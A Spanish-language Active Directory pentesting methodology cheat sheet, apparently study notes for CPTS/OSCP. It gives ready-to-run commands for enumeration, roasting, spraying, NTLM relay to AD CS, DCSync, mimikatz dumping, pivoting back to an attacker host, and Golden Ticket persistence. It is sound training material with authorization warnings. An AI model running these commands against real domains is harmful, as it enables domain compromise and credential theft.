# 🗝️ Kill Chain de Active Directory

> Apuntes de metodología de pentesting de Active Directory, ordenados por fases — desde el reconocimiento sin credenciales hasta la escalada de dominio, AD CS, trusts, post-explotación y persistencia.
>
> Material de estudio para **CPTS / OSCP**.

> [!WARNING]
> Uso exclusivo en laboratorios propios (HackTheBox, entornos autorizados) o en engagements con **permiso escrito**. Atacar sistemas sin autorización es ilegal.

---

## 📑 Índice

| # | Fase | # | Fase |
|---|------|---|------|
| 00 | [Modelo mental](#00--modelo-mental-del-ataque) | 08 | [Abuso de servicios](#08--abuso-de-servicios-internos) |
| 01 | [Recon e identificación](#01--reconocimiento-e-identificación) | 09 | [Movimiento lateral](#09--movimiento-lateral) |
| 02 | [Sin credenciales](#02--sin-credenciales) | 10 | [Escalada de dominio](#10--escalada-a-domain-admin) |
| 03 | [Con credenciales](#03--con-credenciales) | 11 | [Trusts](#11--trusts-entre-dominios-y-bosques) |
| 04 | [BloodHound](#04--bloodhound-el-mapa-del-dominio) | 12 | [Post-explotación](#12--post-explotación-cosecha-de-credenciales) |
| 05 | [Ataques Kerberos](#05--ataques-kerberos) | 13 | [Persistencia](#13--persistencia) |
| 06 | [AD CS (ESC)](#06--ad-cs-abuso-de-certificados) | 14 | [Chuleta rápida](#14--chuleta-rápida) |
| 07 | [Coerción + Relay](#07--coerción-y-ntlm-relay) | | |

### Variables usadas

| Variable | Significado |
|----------|-------------|
| `$DC` | IP del Domain Controller |
| `$DOMAIN` | Dominio (ej. `corp.local`) |
| `$USER` / `$PASS` | Credencial |
| `$HASH` | Hash NTLM |
| `$TARGET` | Host objetivo |
| `$ATACANTE` | Tu IP |

---

## 00 · Modelo mental del ataque

Casi todo engagement de AD sigue el mismo bucle: consigues un punto de apoyo, enumeras, encuentras una credencial o un camino, te mueves lateralmente y repites hasta llegar a Domain Admin. La pregunta que gobierna cada paso es siempre la misma: **¿tengo credenciales o no?**

- **No** → acceso no autenticado: usuarios anónimos, AS-REP roasting, coerción/poisoning de red, password spraying.
- **Sí** → enumera con contexto: BloodHound, SPNs, shares, ACLs, plantillas de certificado. Busca el camino más corto a un objeto privilegiado.

> **El bucle:** Foothold → Enumerar (usuarios, grupos, ACLs, SPNs, AD CS) → Obtener credencial/hash/ticket → Validar dónde vale (NetExec) → Moverse → Volver a enumerar como el nuevo principal. **Documenta cada credencial con dónde funciona y con qué privilegios.**

---

## 01 · Reconocimiento e identificación

Localiza el Domain Controller y mapea servicios. El DC casi siempre tiene 88 (Kerberos), 389/636 (LDAP), 445 (SMB) y 53 (DNS) abiertos a la vez.

### Escaneo inicial `no auth`

```bash
nmap -Pn -p- --min-rate 3000 -oA scan_full $TARGET
# Puertos típicos de un DC en un solo barrido:
nmap -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -oA scan_ad $TARGET
```

### Identificar dominio y nombre del DC `no auth`

```bash
# El rootDSE de LDAP revela el nombre del dominio sin autenticar
nmap -Pn -p 389 --script ldap-rootdse $DC
# CME/NetExec muestran hostname, dominio, SMB signing y versión de SO
crackmapexec smb $DC
netexec smb $DC
enum4linux-ng -A $DC
```

> [!TIP]
> **Fija el DNS y el reloj.** Añade el dominio a `/etc/hosts` y usa el DC como resolutor. Kerberos falla si el nombre del DC no resuelve o el reloj está desfasado: sincroniza con `sudo ntpdate $DC` o `faketime`.

---

## 02 · Sin credenciales

Objetivo: conseguir el primer usuario/hash sin tener nada.

### Sesiones nulas y anónimas `no auth`

```bash
# ¿Shares o usuarios legibles sin credenciales?
netexec smb $DC -u '' -p '' --shares
netexec smb $DC -u 'guest' -p '' --users
# RPC nulo: enumerar usuarios y grupos
rpcclient -U '' -N $DC
#   enumdomusers | querydispinfo | enumdomgroups
# LDAP anónimo (a veces permitido)
ldapsearch -x -H ldap://$DC -b 'DC=corp,DC=local'
```

### Construir lista de usuarios y validarla `no auth`

```bash
# kerbrute valida usuarios sin bloquear cuentas (pre-auth AS-REQ)
kerbrute userenum -d $DOMAIN --dc $DC users.txt
# Formatos habituales: jsmith / j.smith / john.smith / smithj
```

### AS-REP Roasting `kerberos` `no auth`

Usuarios con "no requiere pre-autenticación" entregan un hash crackeable sin credenciales.

```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC \
  -no-pass -format hashcat -outputfile asrep.hash
# Modo 18200 = AS-REP
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Password spraying `no auth`

```bash
# UNA contraseña plausible contra TODOS los usuarios
netexec smb $DC -u users.txt -p 'Primavera2026!' --continue-on-success
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Welcome1'
```

> [!CAUTION]
> **Cuidado con la política de bloqueo.** Comprueba antes de rociar: `netexec smb $DC -u '' -p '' --pass-pol`. Deja margen bajo el umbral y espera la ventana de reset.

### Poisoning LLMNR/NBT-NS (si estás en la LAN) `no auth`

```bash
# Captura NetNTLMv2 de broadcast LLMNR/NBT-NS/mDNS
sudo responder -I eth0 -wd
# Crackea con hashcat -m 5600. Para relay y coerción -> fase 07
```

---

## 03 · Con credenciales

Ya tienes un usuario válido. Enumeras el dominio con contexto. Primero valida **dónde** vale esa credencial.

### Validar la credencial en toda la red `auth`

```bash
# ¿Dónde autentica? ¿Dónde soy admin local? (busca 'Pwn3d!')
netexec smb 10.10.10.0/24 -u $USER -p $PASS
netexec winrm 10.10.10.0/24 -u $USER -p $PASS
netexec smb $DC -u $USER -p $PASS --users --groups --shares --pass-pol
```

### Enumeración LDAP/RPC autenticada `auth`

```bash
# Volcado HTML/JSON de usuarios, grupos, equipos, políticas
ldapdomaindump -u "$DOMAIN\\$USER" -p $PASS $DC
# Cuentas con delegación (objetivo goloso)
netexec ldap $DC -u $USER -p $PASS --trusted-for-delegation
# Rebuscar credenciales en shares legibles
netexec smb $DC -u $USER -p $PASS -M spider_plus
```

> [!TIP]
> **Pass-the-Hash.** En casi toda herramienta de Impacket/NetExec cambia `-p $PASS` por `-H $HASH`. Con el hash NTLM no necesitas la contraseña en claro.

---

## 04 · BloodHound: el mapa del dominio

Con cualquier credencial válida, recolecta el grafo de relaciones: ACLs, sesiones, delegaciones, membresías anidadas.

### Recolección `auth`

```bash
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip
# o vía NetExec:
netexec ldap $DC -u $USER -p $PASS --bloodhound --collection All --dns-server $DC
```

**Queries clave en la GUI:**

- **Shortest paths to Domain Admins** — el camino más corto desde tu usuario.
- **Kerberoastable** y **AS-REP roastable users** — objetivos de la fase 05.
- **Principals with DCSync rights** — atajo directo a todos los hashes.
- ACLs abusables: `GenericAll`, `GenericWrite`, `WriteDACL`, `ForceChangePassword`, `AddMember`.

> [!TIP]
> **Abuso de ACL típico.** ¿`ForceChangePassword` sobre un usuario? Cámbiale la clave con `net rpc password` o `bloodyAD`. ¿`GenericAll` sobre un grupo?
> ```bash
> bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember "GRUPO" $USER
> ```

---

## 05 · Ataques Kerberos

### Kerberoasting `kerberos` `auth`

Cualquier usuario pide tickets de servicio (TGS) de cuentas con SPN. El ticket va cifrado con el hash de la cuenta → crackeable offline. Suelen tener claves débiles y muchos privilegios.

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.hash
# Modo 13100 = TGS-REP (RC4)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```

### Delegaciones `kerberos` `auth`

- **Unconstrained:** host que guarda TGTs; captura el del DC → dominio comprometido.
- **Constrained (S4U):** suplanta a cualquier usuario contra el servicio permitido.
- **RBCD:** con `WriteProperty` sobre un equipo, configuras delegación entrante y suplantas.

```bash
# Constrained delegation (S4U): suplantar a Administrator hacia el servicio objetivo
impacket-getST -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER:$PASS -dc-ip $DC
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/Administrator@$TARGET
```

> [!TIP]
> **RBCD en corto.** Crea un equipo (`impacket-addcomputer`), asígnale delegación entrante sobre el objetivo con `rbcd.py` o `bloodyAD ... set rbcd`, y pide un ST con `getST -spn cifs/$TARGET -impersonate Administrator`.

---

## 06 · AD CS: abuso de certificados

Los Servicios de Certificados de AD son hoy uno de los caminos más rápidos a Domain Admin. **Certipy** enumera y explota plantillas mal configuradas (ESC1–ESC8). Un certificado permite autenticarte como el usuario que representa, y **sobrevive a cambios de contraseña**.

### Enumerar la CA y plantillas vulnerables `cert` `auth`

```bash
# Lista CA, plantillas y marca las vulnerables (ESCx)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
```

| ID | Configuración vulnerable | Abuso |
|------|--------------------------|-------|
| ESC1 | Plantilla permite indicar SAN + auth de cliente, usuarios pueden inscribirse | Pides cert como cualquier usuario (incl. DA) |
| ESC2 | Plantilla con EKU "Any Purpose" o sin EKU | Cert usable para cualquier fin, incl. auth |
| ESC3 | Plantilla de agente de inscripción (Enrollment Agent) | Solicitas certs en nombre de otros |
| ESC4 | Tienes control (ACL) sobre la plantilla | La reescribes para hacerla ESC1 y la explotas |
| ESC6 | CA con flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN arbitrario en cualquier petición |
| ESC7 | Control sobre la CA (ManageCA/ManageCertificates) | Apruebas peticiones / habilitas ESC6 |
| ESC8 | Endpoint web de inscripción (HTTP) sin protección | Relay NTLM del DC a la CA (ver fase 07) |

### ESC1 de principio a fin `cert` `auth`

```bash
# 1) Solicitar certificado con SAN = Administrator
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca 'CORP-CA' -template 'VulnTemplate' -upn Administrator@$DOMAIN
# 2) Autenticarse con el .pfx -> TGT + hash NT del DA
certipy auth -pfx administrator.pfx -dc-ip $DC
```

> [!NOTE]
> **El resultado.** `certipy auth` te devuelve un TGT (`.ccache`) y el hash NT. Con eso saltas a movimiento lateral (fase 09) o directamente a DCSync (fase 10). ESC4 → primero `certipy template` para volverla vulnerable; ESC6/ESC8 combinan con coerción (fase 07).

---

## 07 · Coerción y NTLM relay

Forzar a una máquina (incluido el DC) a autenticarse contra ti, y reenviar (relay) esa autenticación a un servicio que no valida firma. La cadena estrella hoy: **coaccionar al DC y hacer relay a AD CS (ESC8)** para obtener un certificado del propio DC.

### Forzar autenticación del DC `auth`

```bash
# PetitPotam (MS-EFSR), a menudo sin credenciales
petitpotam.py -u $USER -p $PASS $ATACANTE $DC
# Coercer prueba múltiples métodos (EFS, DFS, spooler...)
coercer coerce -u $USER -p $PASS -t $DC -l $ATACANTE
# PrinterBug (MS-RPRN)
printerbug.py $DOMAIN/$USER:$PASS@$DC $ATACANTE
```

### Cadena ESC8: relay del DC a AD CS `cert` `auth`

```bash
# 1) Relay hacia el endpoint web de la CA
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
# 2) Coacciona al DC contra tu IP (en otra terminal)
petitpotam.py -u $USER -p $PASS $ATACANTE $DC
# 3) Autentica con el cert del DC -> hash de la cuenta máquina -> DCSync
certipy auth -pfx dc.pfx -dc-ip $DC
```

### Relay a LDAP (RBCD) `auth`

```bash
# Relay a LDAP para configurar RBCD sobre la víctima
impacket-ntlmrelayx -t ldap://$DC --delegate-access --escalate-user $USER -smb2support
# tras el relay: configura RBCD y salta con getST (fase 05)
```

> [!CAUTION]
> **Requisito del relay.** El destino no debe exigir firma: SMB relay necesita `signing:False` (mira el barrido de la fase 01), y el relay a LDAP requiere que LDAP signing / channel binding no estén forzados.

---

## 08 · Abuso de servicios internos

### MSSQL `auth`

```bash
netexec mssql $TARGET -u $USER -p $PASS
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET -windows-auth
# dentro:
#   enable_xp_cmdshell  ->  xp_cmdshell whoami
#   enum_links          ->  pivotar por servidores enlazados
#   exec_as_login / exec_as_user  ->  impersonación
```

### GPP y GPO `auth`

```bash
# cpassword en SYSVOL (clave AES pública -> descifrable)
netexec smb $DC -u $USER -p $PASS -M gpp_password
# Con WriteProperty sobre una GPO -> ejecutas en los equipos que la aplican
python3 pyGPOAbuse.py $DOMAIN/$USER:$PASS -gpo-id '<GUID>' \
  -command 'net localgroup administrators $USER /add'
```

### LAPS y gMSA `auth`

```bash
# LAPS: password de admin local de cada equipo (si tienes el permiso de lectura)
netexec ldap $DC -u $USER -p $PASS -M laps
# gMSA: lee el blob y deriva el hash NT de la cuenta gestionada
netexec ldap $DC -u $USER -p $PASS --gmsa
```

---

## 09 · Movimiento lateral

Tienes credencial/hash/ticket que es admin local en algún host. Consigue ejecución remota según qué puerto está abierto y cuánto ruido puedes permitirte.

### Shells remotas con Impacket `auth`

```bash
impacket-psexec  $DOMAIN/$USER:$PASS@$TARGET   # SYSTEM, ruidoso
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET   # WMI, sigiloso
impacket-smbexec $DOMAIN/$USER:$PASS@$TARGET
impacket-atexec  $DOMAIN/$USER:$PASS@$TARGET whoami
```

### WinRM, Pass-the-Hash y Pass-the-Ticket `auth`

```bash
evil-winrm -i $TARGET -u $USER -p $PASS
evil-winrm -i $TARGET -u $USER -H $HASH          # Pass-the-Hash
impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$TARGET
# Pass-the-Ticket:
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/$USER@$TARGET
```

---

## 10 · Escalada a Domain Admin

El objetivo final. Casi siempre pasa por conseguir los hashes del dominio (DCSync) o comprometer directamente el DC.

### DCSync `auth`

Con derechos de replicación (`DS-Replication-Get-Changes` — BloodHound los marca), pides al DC que replique los hashes, incluido `krbtgt`. No hace falta pisar el DC.

```bash
# Vuelca TODOS los hashes NTDS del dominio
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
# Solo krbtgt (para el Golden Ticket de la fase 13)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user Administrator
```

### Escalada local en un host `auth`

- Triaje automático con **winPEAS** / **PrivescCheck**.
- `whoami /priv`. Con `SeImpersonatePrivilege` → familia **Potato** (PrintSpoofer, GodPotato) → SYSTEM.
- Servicios con permisos débiles, tareas programadas, GPP `cpassword`, `unattend.xml`.

```powershell
whoami /priv
# Si SeImpersonatePrivilege está habilitado:
PrintSpoofer.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"
```

---

## 11 · Trusts entre dominios y bosques

Ser DA de un dominio no siempre es el final: si hay relaciones de confianza, puedes saltar a otros dominios del bosque o a bosques externos. La clave es el **SID history** y los tickets inter-realm.

### Enumerar confianzas `auth`

```bash
netexec ldap $DC -u $USER -p $PASS -M enum_trusts
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC       # SID del dominio
# En BloodHound: la arista 'TrustedBy' muestra la dirección
```

### Child → Parent: ataque al bosque `kerberos` `auth`

Siendo DA de un dominio hijo, forjas un Golden Ticket con SID history del grupo Enterprise Admins del padre → DA de todo el bosque.

```bash
# Necesitas: krbtgt del hijo, SID del hijo, y SID de Enterprise Admins del padre (-519)
impacket-ticketer -nthash $KRBTGT_HIJO -domain-sid $SID_HIJO \
  -domain hijo.corp.local -extra-sid $SID_PADRE-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass \
  hijo.corp.local/Administrator@dc-padre.corp.local -just-dc
```

> [!TIP]
> **Trusts externos.** Entre bosques distintos revisa el **trust key** (secreto de la relación, vía `secretsdump`) para forjar tickets inter-realm, y ten en cuenta el **SID filtering**, que puede bloquear el abuso de SID history.

---

## 12 · Post-explotación: cosecha de credenciales

Como admin local o de dominio, extrae todo el material de credenciales para pivotar y persistir.

### Volcado local `auth`

```bash
# mimikatz (en el host, como admin):
#   privilege::debug
#   sekurlsa::logonpasswords
#   lsadump::sam

# Remoto y más limpio con NetExec:
netexec smb $TARGET -u $USER -p $PASS --sam --lsa
netexec smb $TARGET -u $USER -p $PASS -M lsassy
```

### Pivoting hacia segmentos internos `auth`

```bash
# Túnel SOCKS con ligolo-ng o chisel:
#   (atacante) ./proxy -selfcert
#   (víctima)  ./agent -connect $ATACANTE:11601
proxychains netexec smb 172.16.0.0/24 -u $USER -H $HASH
```

> [!TIP]
> **Anota cada secreto.** Cada hash, ticket, cert y contraseña reinicia el bucle de la fase 03: valida dónde vale el nuevo material antes de asumir que has terminado.

---

## 13 · Persistencia

> [!WARNING]
> En un examen/lab querrás mantener acceso. En un engagement real, solo con **autorización explícita** y documentando cada artefacto para limpiarlo.

### Golden Ticket `kerberos` `auth`

Con el hash de `krbtgt` forjas TGTs arbitrarios: cualquier usuario, cualquier grupo, validez larga. Persistencia a nivel de dominio.

```bash
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $DOMAIN/Administrator@$DC
```

### Otras vías `auth`

- **Silver Ticket:** con el hash de una cuenta de servicio, forjas TGS para ese servicio (no toca el DC).
- **Certificado persistente (AD CS):** un `.pfx` de la fase 06 sigue autenticando aunque cambien la contraseña; vigencia de años.
- **DCSync recurrente** con derechos de replicación otorgados a una cuenta tuya.
- **Skeleton Key** (`lsadump::misc`) — contraseña maestra en el DC. Muy ruidosa.
- **AdminSDHolder / ACL backdoor:** derechos persistentes sobre objetos protegidos.

> [!CAUTION]
> **Higiene de laboratorio.** El hash de `krbtgt` y los Golden Tickets sobreviven a cambios de contraseña; los certificados de AD CS también. Documenta todo lo que forjes; en entornos reales exige doble rotación de `krbtgt` y revocación de certs para limpiar.

---

## 14 · Chuleta rápida

### Secuencia por defecto

1. `nmap` → identifica DC, dominio, SMB signing.
2. ¿anónimo? → shares, usuarios (rpcclient / netexec / ldap).
3. Lista de usuarios → kerbrute → AS-REP roast → spray suave.
4. Primera credencial → netexec por toda la red (busca `Pwn3d!`).
5. BloodHound → camino más corto a DA.
6. Kerberoast + ACL/delegación + `certipy find` (AD CS suele ser el atajo).
7. ¿coerción posible? → relay a AD CS (ESC8) o a LDAP (RBCD).
8. MSSQL / GPP / LAPS / gMSA → más credenciales.
9. ¿DCSync? → secretsdump → krbtgt + Administrator.
10. ¿trusts? → salto a otros dominios/bosques (SID history).
11. Volcado, pivoting y persistencia si procede.

### Kit por categoría

| Categoría | Herramientas |
|-----------|--------------|
| Barrido/validación | netexec (crackmapexec), enum4linux-ng, rpcclient |
| Usuarios/Kerberos | kerbrute, impacket-GetNPUsers, impacket-GetUserSPNs |
| Mapa | bloodhound-python + BloodHound GUI, ldapdomaindump, bloodyAD |
| AD CS | certipy (find / req / auth / template) |
| Coerción/Relay | petitpotam, coercer, printerbug, impacket-ntlmrelayx |
| Servicios | impacket-mssqlclient, pyGPOAbuse, módulos `laps`/`gmsa` de netexec |
| Ejecución | impacket-psexec/wmiexec/smbexec, evil-winrm |
| Credenciales | impacket-secretsdump, mimikatz, lsassy, Rubeus |
| Cracking | hashcat (18200 AS-REP · 13100 TGS · 5600 NetNTLMv2 · 1000 NTLM) |
| Pivoting | ligolo-ng, chisel, proxychains, sshuttle |
| Privesc local | winPEAS, PrivescCheck, PrintSpoofer, GodPotato |

### Modos de hashcat frecuentes

| Modo | Tipo |
|------|------|
| `1000` | NTLM |
| `5600` | NetNTLMv2 (Responder) |
| `13100` | Kerberoast (TGS-REP) |
| `18200` | AS-REP Roast |
| `19700` | Kerberoast (AES) |

---

## 📚 Referencias

- [The Hacker Recipes — Active Directory](https://www.thehacker.recipes/ad/)
- [Orange Cyberdefense — AD mind map ( Propagation Paths)](https://github.com/Orange-Cyberdefense/ocd-mindmaps)
- [HackTricks — Windows / Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Certipy — AD CS](https://github.com/ly4k/Certipy)
- HTB Academy — módulos de *Active Directory* y *AD CS Attacks* (CPTS path)

---

<sub>Apuntes de metodología · uso en laboratorios autorizados (HTB / OSCP) · <b>g0nxz</b></sub>
